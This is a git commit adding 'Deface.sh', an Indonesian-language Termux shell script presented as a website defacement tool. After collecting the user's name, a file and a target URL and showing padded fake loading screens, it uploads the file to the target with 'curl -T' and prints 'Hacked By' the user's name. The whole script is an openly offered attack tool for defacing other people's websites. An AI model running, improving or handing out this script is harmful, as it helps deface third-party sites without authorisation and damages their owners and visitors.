2d05cd8ab0e59420578d4d01a61af13a12105866
Bl4ck_Dr460n <49341995+Bl4ckDr460n@users.noreply.github.com>
2019-04-07 08:08:24 +0700

    Add files via upload

---
+++ Deface.sh
@@ -0,0 +1,125 @@
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+pkg install curl
+pkg install toilet
+clear
+echo
+echo $white
+read -p "Masukan Nama Anda >> " nama
+clear
+toilet -f future "Deface" | lolcat
+echo $red "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+echo $green "Author : Billal { Bl4ck_Dr460n }"
+echo $green "Gunakan Dengan Bijak!!!"
+echo $blue
+echo "Taruh File Di Internal Luar Folder!!"
+echo $red "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+echo
+echo
+echo $cyan "Masukan Script "$white
+read -p "Bl4ck_Dr460n >> " tiara
+echo
+echo $cyan "Masukan Web !! "$white
+read -p "Bl4ck_Dr460n >> " web
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading !..."
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading .!.."
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading ..!."
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading ...!"
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading !..."
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading .!.."
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading ..!."
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading ...!"
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading !..."
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading .!.."
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading ..!."
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading ...!"
+sleep 0.9
+clear
+sleep 0.9
+curl -T /sdcard/$tiara $web
+echo
+echo
+echo
+echo
+toilet -f mono12 "DONE !!!" | lolcat
+sleep 3
+clear
+echo
+echo $green "Hacked By $nama"
+echo     
+echo $red "Silahkan Cek "$blue"$web"
